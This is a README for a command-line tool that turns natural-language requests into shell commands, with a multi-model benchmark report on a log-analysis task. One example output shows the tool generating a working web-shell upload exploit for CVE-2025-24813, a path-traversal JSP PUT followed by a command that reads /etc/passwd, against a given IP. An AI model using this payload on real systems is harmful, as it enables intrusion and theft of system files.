# CLI AI Assist

CLI AI Assist 是一個 AI 助手，專門幫你把人類語言翻譯成命令列指令。就像一位超有經驗的系統管理員，熟悉 Windows 和 Linux，幫你快速搞定各種檔案壓縮、目錄管理的需求。

** AI 雖然很厲害，但還是有可能出錯，請務必謹慎使用及根據實際情況進行調整 **

## 功能特色
- 按指示生成 Bash 和 PowerShell 指令。
- 提供詳細又貼心的解決方案，助力理解和學習命令列指令。
- 即時互動模式，隨時問隨時答。
- 基準測試(benchmark)模式，測試多種 AI 模型。
- 環境變數設定，方便整合 API。
- 閱讀附加說明文件，讓 AI 更了解你的需求。

## 安裝方式
可於[openrouter.ai](https://openrouter.ai/)註冊帳號並取得 API 金鑰(目前低於1美金用量前都不收費, 按gemini-2.0-flash 平均2000 Token/次算,約摸可以用2000次)，然後使用以下步驟安裝：

1. 先把專案下載下來：
   ```bash
    git clone https://github.com/your-repo/cli-AI-assist.git
    cd cli-AI-assist
   ```
2. 安裝需要的套件：
   ```bash
    pip install -r requirements.txt
    python setup.py install --user
    bash --login
   ```
3. 設定環境變數(如使用openrouter 只需輸入API key 其他default 即可)：
   ```bash
    ai --setup
   ```
4. 解除安裝：
   ```bash
    pip uninstall cli-ai-assist
   ```


## 基本用法
直接輸入你的需求，AI 會幫你生成命令列指令：  
建議指令模式: 用<工具>做<工作>，例如：
1. 用 tar 壓縮 project
2. 顯示在 https://pastebin.com/raw/Mycq5TpC 中哪个IP的请求次数最多及查詢其來自哪個國家
3. 用 curl 下載 https://example.com/file.zip 並解壓縮

```bash
ai "用 tar 和 gzip 把 'project' 資料夾壓縮起來。"
```

### 範例輸出
```plaintext
Explain:
`tar` 命令用於將多個檔案和目錄封存成一個檔案，而 `gzip` 用於壓縮該封存檔。

*   `tar`: 封存工具。
    *   `-c`: 建立新的封存檔。
    *   `-z`: 使用 gzip 壓縮。
    *   `-v`: 顯示詳細輸出（可選）。
    *   `-f`: 指定封存檔名稱。
    *   `-C`: 更改目錄到指定的路徑後再執行指令。這對壓縮相對路徑非常有用。
*   `gzip`: 壓縮工具 (透過 `tar` 的 `-z` 選項使用)。
`~/project`: 指定要封存和壓縮的資料夾。 如果資料夾名稱包含空格，則必須將其用引號括起來。 使用 `-C` 選項，我們可以導航到 "project" 資料夾的父目錄，並指定資料夾名稱，以便正確儲存相對路徑。
Command > tar -czvf project.tar.gz -C ~ project # 如果系統沒有 tar，請執行：sudo apt-get install tar
```

```
ai -a ../CVE-2025-24813/README.md 對192.168.1.1使用
Running in Bash
Model: gemini-2.0-flash
Explain:
该解决方案使用`curl`命令模拟PoC步骤，通过PUT请求上传包含恶意代码的JSP文件到目标服务器，然后通过GET请求访问该文件，执行`cat /etc/passwd`命令。

*   **步骤1：上传恶意JSP文件**

    *   `curl -X PUT`: 使用PUT方法发送HTTP请求。
    *   `"http://192.168.1.1/uploads/../webapps/ROOT/updates.jsp"`: 目标URL，利用路径遍历漏洞将文件上传到可执行目录。
    *   `-H "Content-Type: application/x-jsp"`: 设置Content-Type为`application/x-jsp`。
    *   `--data-raw`: 指定要上传的原始数据。
    *   `'<%...%>'`: 包含Java代码的JSP内容，用于执行命令。这段代码会创建一个表单，允许用户通过GET请求传递`cmd`参数，并在服务器上执行该命令。
    *   `-i`: 显示HTTP响应头部。
*   **步骤2：执行命令并获取结果**

    *   `curl "http://192.168.1.1/updates.jsp?cmd=cat /etc/passwd"`: 发送GET请求，通过`cmd`参数传递要执行的命令（`cat /etc/passwd`）。
    *   `-i`: 显示HTTP响应头部。

注意：
1.  该命令存在风险，仅限授权测试，严禁用于非法用途。
2.  该命令会尝试覆盖目标服务器上的`updates.jsp`文件，请谨慎操作。
3.  如果目标服务器没有运行在80端口，请在IP地址后添加正确的端口号 (e.g., `http://192.168.1.1:8080/...`).
Command > curl -X PUT "http://192.168.1.1/uploads/../webapps/ROOT/updates.jsp" -H "Content-Type: application/x-jsp" --data-raw '<%@ page import="java.io.*" %><html><body><form method="GET"><input type="text" name="cmd"><input type="submit" value="Run"></form><% if(request.getParameter("cmd") != null) {Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));String l; while((l=r.readLine())!=null){ out.println(l+"<br>"); } } %></body></html>' -i; curl "http://192.168.1.1/updates.jsp?cmd=cat /etc/passwd" -i # 仅限授权测试，严禁用于非法用途. 如果服务器端口不是80，请修改URL (e.g., http://192.168.1.1:8080/...)
```

## 互動模式
啟動互動模式，隨時輸入需求：
```bash
ai --interactive
```
在互動模式下輸入指令，還可以直接執行。

## 基準測試模式
用基準測試模式試試多種 AI 模型：
** 目前只支持單個base url **
```bash
ai -b -m models.txt "生成20個隨機ip和機名"
```

## 附加說明文件
附加加強AI的知識庫的說明文件(例如工具的README.md)，讓AI更了解你的需求：
```bash
ai -a ./README.md 安裝這個專案
```



# 針對Openrouter上比較熱門的模型測試(Gemini 2.5 pro 分析生成😁)

### 引言

本報告旨在根據提供的基準測試數據 (`生成數據.txt`)、價格信息 (`price.txt`) 以及系統提示 (`systemprompt.txt`)，客觀評估不同 AI 模型在執行特定 Bash 腳本任務時的表現。該任務要求模型生成一個 Bash 命令，用於分析來自指定 URL (https://pastebin.com/raw/Mycq5TpC) 的日誌數據，找出請求次數最多的 IP 地址，並查詢該 IP 所屬的國家。評估將涵蓋代碼質量、可讀性、對問題的理解、成本、速度、模型特性、運行結果等多個維度，最終選出表現最佳的 MVP (Minimum Viable Product) 模型，並針對不同優先級提供建議方案。

### 評估標準

*   **User prompt:** 顯示在 https://pastebin.com/raw/Mycq5TpC 中哪个IP的请求次数最多及查詢其來自哪個國家
*   **正確答案:** IP: `95.108.151.244`, 國家: `RU` 或 `Russia` (視查詢工具/API而定)

*   **執行結果 (Execution Result):** 命令是否成功執行？是否返回正確的 IP 和國家？錯誤處理是否得當？ (評分 1-5)
*   **代碼質量 (Code Quality):**
    *   **正確性:** 命令邏輯是否能成功完成任務？
    *   **健壯性:** 能否處理潛在問題（如工具缺失、API 錯誤）？是否優先使用可靠方法 (API vs whois/geoiplookup)?
    *   **效率:** 命令流程是否簡潔高效？
    *   **工具選擇:** 是否優先使用標準工具？是否提及或處理了非標準工具（如 `geoiplookup`, `jq`, `whois`）的依賴？
    *   **語言一致性:** 是否使用用戶提示的語言（繁體中文）？ (評分 1-5)
*   **可讀性與解釋 (Readability/Explanation):** `explain` 標籤中的解釋是否清晰易懂？`command` 本身是否格式良好？`[context]` 是否準確？ (評分 1-5)
*   **運行結果質量 (Result Quality):** 輸出格式是否清晰？是否包含請求的 IP 和國家？
*   **成本效益 (Cost-Effectiveness):** 每次運行的成本（參考 `price.txt`，若無對應記錄則標註 N/A）。
*   **速度 (Speed):** 生成時間 (秒, from `生成數據.txt`) 和 Tokens per second (tps, from `price.txt` 作為參考)。
*   **遵循系統提示 (Adherence to System Prompt):** 是否包含 `context`, `explain`, `command` 標籤？是否提供單一、可執行的命令？是否符合企業級、安全的要求？ (評分 1-5)
*   **模型特性 (Model Characteristics):** 隱含考慮（如模型大小 Mini/Pro/7B/70B 等）。

### 數據源

*   `生成數據.txt`: 各模型針對用戶提示的基準測試結果 (包含執行時間、Token數、模型輸出)。
*   `price.txt`: 部分模型在特定時間點的 API 調用成本、Token 數及速度。
*   `systemprompt.txt`: 指導 AI 模型回應格式和內容的系統提示。

### 不同優先級推薦方案

根據上述分析，針對不同需求，推薦以下模型：

1.  **最高性價比 (平衡 - MVP): `openai/gpt-4.1-mini`**
    *   **理由:** 成功使用可靠的公共 API (`ip-api.com`) 解決問題，避免了本地工具依賴。命令簡潔高效，解釋清晰，遵循指示。在所有成功的 API 方案中，成本相對較低 ($0.00101)，生成速度快 (6.81s)，輸出 Token 合理 (815/430)。提供了最佳的質量、可靠性與成本的平衡點。 **綜合評分: 4.5/5**

2.  **質量優先: `google/gemini-2.5-pro-preview-03-25`**
    *   **理由:** 生成了高質量的解決方案，使用可靠 API (`ipinfo.io`)，並在 `awk` 命令中巧妙地嵌入了 `curl` 調用進行國家查詢，無需額外步驟或變量。解釋非常詳細和清晰，對問題理解透徹，語言符合要求。雖然成本 ($0.00904) 和生成時間 (23.95s) 相對較高，但優先考慮代碼質量和解釋深度時，它是極佳的選擇。 **綜合評分: 4.5/5** (`openai/o3-mini-high` 作為備選，同樣優秀但成本更高 $0.0109)。

3.  **價錢優先: `google/gemini-2.0-flash-001`**
    *   **理由:** 在所有 *成功執行並返回正確結果* 的模型中，此模型成本最低 ($0.000369)，約節省 2.7 倍於 `openai/gpt-4.1-mini`。它使用了 `whois` 命令查詢國家，雖然此方法健壯性不如 API 調用（依賴 `whois` 安裝和輸出格式的穩定性），但在本次測試環境下是有效的且成功返回 `RU`。如果首要目標是盡可能降低成本，並且可以接受 `whois` 的潛在限制，則此模型是首選。 **綜合評分: 3.5/5** (如果必須使用 API 且追求低價，`meta-llama/llama-4-maverick` ($0.000511) 是次優選擇，但需要額外安裝 `jq`，評分 3.5/5)。

### 模型表現摘要表

| 模型 (Model)                           | 執行結果 (評分) | 代碼質量 (評分) | 可讀性/解釋 (評分) | 遵循提示 (評分) | 成本 (Cost)¹ | 生成時間 (秒) | Tokens (In/Out)² | 備註 (Notes)                                                                    |
| :------------------------------------- | :-------------- | :-------------- | :----------------- | :-------------- | :----------- | :------------ | :-------------- | :------------------------------------------------------------------------------ |
| google/gemini-2.0-flash-001            | 成功 (4/5)      | 中 (3/5)        | 好 (4/5)           | 好 (4/5)        | $0.000369    | 6.19          | 877 / 703       | 使用 whois (成功, RU)，健壯性稍差。提供了 geoiplookup 作為備選。**價錢優先選項**   |
| openai/gpt-4o-mini                     | 失敗 (1/5)      | 差 (2/5)        | 好 (4/5)           | 好 (4/5)        | $0.000336    | 4.48          | 815 / 357       | 依賴 geoiplookup (未安裝)。                                                     |
| google/gemini-2.5-pro-preview-03-25    | 成功 (5/5)      | 優 (5/5)        | 優 (5/5)           | 優 (5/5)        | $0.00904     | 23.95         | 877 / 794       | API (`ipinfo.io`)，awk內嵌curl，解釋詳細，語言正確。成本較高。 **質量優先選項** |
| meta-llama/llama-4-maverick            | 成功 (3.5/5)    | 中 (3/5)        | 好 (4/5)           | 好 (4/5)        | $0.000511    | 4.78          | 822 / 456       | API (`ip-api.com`, Russia)，需 `jq`。價錢優先的 API 方案備選。                   |
| mistralai/mistral-7b-instruct-v0.2     | 無命令 (1/5)    | 差 (1/5)        | 無 (1/5)           | 差 (1/5)        | $0.000329    | 5.76          | 997 / 649       | 未能生成有效命令。                                                              |
| anthropic/claude-3.7-sonnet            | 部分成功 (2/5)  | 中 (2/5)        | 中 (3/5)           | 中 (3/5)        | $0.0119      | 11.91         | 957 / 600       | 成功輸出 IP/次數，國家查詢部分未顯示/有誤。重複`curl`日誌。                          |
| anthropic/claude-3.7-sonnet:thinking   | 成功 (4/5)      | 好 (4/5)        | 優 (5/5)           | 優 (5/5)        | $0.0575      | 49.63         | 986 / 3636      | API (`ip-api.com`, Russia)，步驟清晰，存變量。成本極高，耗時長，Token 多。       |
| x-ai/grok-3-beta                       | 部分成功 (2/5)  | 差 (2/5)        | 好 (4/5)           | 好 (4/5)        | $0.0119      | 19.14         | 805 / 630       | IP/計數正確，國家解析錯誤 (`success`)。成本較高。                             |
| x-ai/grok-3-mini-beta                  | 無命令 (1/5)    | 差 (1/5)        | 無 (1/5)           | 差 (1/5)        | $0.000455    | 14.27         | 806 / 426       | 未能生成有效命令。                                                              |
| deepseek/deepseek-chat-v3-0324         | 成功 (3/5)      | 中 (3/5)        | 好 (4/5)           | 好 (4/5)        | $0.00057     | 31.24         | 837 / 324       | 使用 whois (成功, RU)，健壯性稍差，耗時較長。                                  |
| qwen/qwen-2.5-72b-instruct           | 失敗 (1/5)      | 差 (2/5)        | 好 (4/5)           | 好 (4/5)        | $0.000234    | 10.30         | 815 / 321       | 依賴 geoiplookup (未安裝)。                                                     |
| qwen/qwq-32b                           | 成功 (3/5)      | 中 (3/5)        | 無 (1/5)           | 差 (2/5)        | $0.000705    | 99.18         | 818 / 2913      | API (`ipinfo.io`, RU)，執行時間極長，Token 多，缺解釋/Context。                |
| meta-llama/llama-4-scout               | 失敗 (1/5)      | 差 (2/5)        | 好 (4/5)           | 好 (4/5)        | $0.000189    | 6.88          | 810 / 413       | 依賴 geoiplookup (未安裝)。                                                     |
| qwen/qwen-turbo                        | 失敗 (1/5)      | 差 (2/5)        | 好 (4/5)           | 好 (4/5)        | $0.000123    | 4.91          | 815 / 409       | 依賴 geoiplookup (未安裝)。成本最低。                                          |
| deepseek/deepseek-r1-distill-llama-70b | 失敗 (1/5)      | 差 (1/5)        | 好 (4/5)           | 好 (4/5)        | $0.000364    | 21.47         | 813 / 666       | 依賴 geoiplookup (未安裝)。含 `[[` bashism (可能在 sh 報錯)。                   |
| openai/gpt-4.1                         | 成功 (4/5)      | 好 (4/5)        | 優 (5/5)           | 優 (5/5)        | $0.00554     | 12.11         | 815 / 489       | 使用 whois (成功, RU)，健壯性稍差。解釋詳細。                                  |
| openai/o4-mini-high                    | 成功 (3/5)      | 中 (3/5)        | 優 (5/5)           | 優 (5/5)        | $0.0193      | 39.92         | 814 / 4180      | 使用 whois (成功, RU)，健壯性稍差。成本高，耗時長，Token 異常多。              |
| openai/o4-mini                         | 失敗 (1/5)      | 差 (1/5)        | 好 (4/5)           | 好 (4/5)        | $0.00651     | 16.24         | 814 / 1277      | 語法錯誤 (`read` 重定向)。                                                     |
| openai/o3-mini-high                    | 成功 (5/5)      | 優 (5/5)        | 優 (5/5)           | 優 (5/5)        | $0.0109      | 16.97         | 814 / 2279      | API (`ip-api.com`, Russia)，`grep` 解析 JSON，解釋詳細。成本較高。(質量備選)   |
| openai/o3-mini                         | 成功 (5/5)      | 優 (5/5)        | 優 (5/5)           | 優 (5/5)        | $0.00798     | 10.57         | 814 / 1609      | API (`ipinfo.io`, RU)，命令簡潔，解釋清晰。成本相對較高。                      |
| **openai/gpt-4.1-mini**               | **成功 (5/5)**  | **優 (5/5)**    | **優 (5/5)**       | **優 (5/5)**    | $0.00101     | 6.81          | 815 / 430       | API (`ip-api.com`, Russia)，解釋佳，命令簡潔。 **(MVP)**                        |
| openai/gpt-4.1-nano                    | 無命令 (1/5)    | 差 (1/5)        | 無 (1/5)           | 差 (1/5)        | $0.000253    | 3.25          | 815 / 428       | 未能生成有效命令。成本低。                                                     |

**註釋:**  
¹ 成本數據來自 `price.txt` 中對應模型的記錄（若存在）。這可能不完全代表 `生成數據.txt` 中該次運行的精確成本，但可作為比較參考。N/A 表示 `price.txt` 中未找到對應記錄。  
² Tokens (In/Out) 數據來自 `生成數據.txt`。

### 詳細分析

1.  **成功執行的模型 (按方法分類):**
    *   **API 方案 (最優方法):** `google/gemini-2.5-pro-preview-03-25`, `meta-llama/llama-4-maverick` (需 `jq`), `anthropic/claude-3.7-sonnet:thinking`, `openai/gpt-4.1-mini`, `qwen/qwq-32b`, `openai/o3-mini-high`, `openai/o3-mini` 都成功使用了 `ipinfo.io` 或 `ip-api.com` 等公共 API。這是最健壯的方法，不依賴本地工具狀態。
        *   `gemini-2.5-pro`, `o3-mini-high`, `o3-mini`, `gpt-4.1-mini` 在代碼質量和解釋方面表現突出。
        *   `qwq-32b` 雖然成功，但解釋缺失且耗時過長。
        *   `maverick` 需要 `jq` 依賴，但價格較低。
        *   `sonnet:thinking` 成本過高。
    *   **Whois 方案 (次優方法):** `google/gemini-2.0-flash-001`, `deepseek/deepseek-chat-v3-0324`, `openai/o4-mini-high`, `openai/gpt-4.1` 使用了 `whois` 命令。本次測試成功，但依賴 `whois` 安裝和其輸出格式穩定性，健壯性不如 API。`flash-001` 成本最低，`o4-mini-high` 成本和 Tokens 數過高，`deepseek` 耗時較長。

2.  **依賴特定工具或失敗的模型:**
    *   **`geoiplookup` 依賴:** 大量模型（`openai/gpt-4o-mini`, `qwen/qwen-2.5-72b-instruct`, `meta-llama/llama-4-scout`, `qwen/qwen-turbo`, `deepseek/deepseek-r1-distill-llama-70b`）選擇了 `geoiplookup`。此工具非標準預裝，導致命令在測試環境失敗。雖然有些模型提到安裝，但直接提供的命令無法運行。`qwen-turbo` 是其中成本最低的模型。
    *   **解析/邏輯錯誤:** `x-ai/grok-3-beta` 國家解析錯誤 (`success`)。 `anthropic/claude-3.7-sonnet` 國家部分未顯示，且重複執行日誌獲取部分，效率低。
    *   **語法錯誤:** `openai/o4-mini` 使用了無效的 `read` 重定向語法。 `deepseek-r1` 的 `[[` 可能在非 Bash shell (如 sh) 下報錯。
    *   **無輸出或 Provider 錯誤:** `mistralai/mistral-7b-instruct-v0.2`, `x-ai/grok-3-mini-beta`, `openai/gpt-4.1-nano` 未生成命令。

3.  **成本與效率考量:**
    *   **低成本:** 許多低成本模型（如 Qwen-Turbo ($0.000123), Llama-Scout ($0.000189), GPT-4.1-nano ($0.000253), GPT-4o-mini ($0.000336)）未能成功執行或依賴缺失工具。`google/gemini-2.0-flash-001` ($0.000369) 是成功的最低成本選項（使用 `whois`）。`meta-llama/llama-4-maverick` ($0.000511) 是成功的最低成本 *API* 選項（需 `jq`）。
    *   **中成本:** `openai/gpt-4.1-mini` ($0.00101) 在成功且使用 API 的模型中性價比較高。
    *   **高成本:** `google/gemini-2.5-pro` ($0.00904), `openai/o3-mini` ($0.00798), `openai/o3-mini-high` ($0.0109), `x-ai/grok-3-beta` ($0.0119), `anthropic/claude-3.7-sonnet` ($0.0119), `openai/o4-mini-high` ($0.0193), `anthropic/claude-3.7-sonnet:thinking` ($0.0575) 成本顯著增加。其中 `sonnet:thinking` (3636 tokens), `o4-mini-high` (4180 tokens), `qwq-32b` (2913 tokens) 的輸出 Token 量異常高，`sonnet:thinking` (49s), `o4-mini-high` (39s), `qwq-32b` (99s), `deepseek-chat` (31s), `gemini-2.5-pro` (23s) 生成時間也偏長。

4.  **遵循指示情況:**
    *   大多數成功使用 API 或 Whois 的模型（如 `gemini-2.5-pro`, `gpt-4.1-mini`, `o3-mini/high`, `sonnet:thinking`, `gemini-flash`, `o4-mini-high`, `gpt-4.1`）較好地遵循了 `systemprompt.txt` 的要求（標籤、單一命令、解釋）。
    *   部分模型缺少解釋或 context (`qwq-32b`, `mistral-7b`, `grok-mini`, `gpt-nano`)。
    *   語言匹配方面，大部分提供中文解釋的模型都使用了繁體中文，符合要求。`openai/gpt-4o-mini`, `x-ai/grok-3-beta`, `openai/o3-mini-high` 的解釋部分使用了英文，未完全遵循提示。

### 結論

本次評測顯示，不同 AI 模型在處理需要與外部環境交互（下載文件、調用 API、檢查本地工具）的具體技術任務時，表現差異顯著。

*   使用公共 API (如 `ipinfo.io`, `ip-api.com`) 的解決方案普遍比依賴本地工具 (`geoiplookup`, `whois`) 的方案更健壯、通用，且不易因環境差異失敗。
*   許多模型傾向於使用 `geoiplookup`，但在沒有明確告知用戶需要安裝該工具的情況下，這是一個不佳的選擇，導致了大量失敗案例。
*   模型成本與成功率、代碼質量並非嚴格正相關。中等成本的 `openai/gpt-4.1-mini` 在此任務中表現出色，提供了高性價比。而一些非常便宜的模型則未能完成任務。
*   輸出 Token 數量和生成時間也是重要考量因素，部分高成本模型（如 `sonnet:thinking`, `o4-mini-high`, `qwq-32b`）可能過於冗長或耗時。
*   `google/gemini-2.5-pro` 展現了非常高的代碼質量和理解深度，是質量優先場景的有力競爭者。
*   遵循系統提示（包括語言匹配）也是評估模型是否可靠的重要指標。

選擇模型時，應優先考慮使用 API 進行地理位置查詢的模型以確保健壯性，然後根據預算、對解釋詳細度的要求以及對額外依賴（如 `jq`）的容忍度進行權衡。以上提供的 MVP 和不同優先級推薦方案旨在幫助用戶根據自身需求做出明智選擇。  


## 授權
這個專案是用 MIT 授權的，詳情請看 LICENSE 檔案。
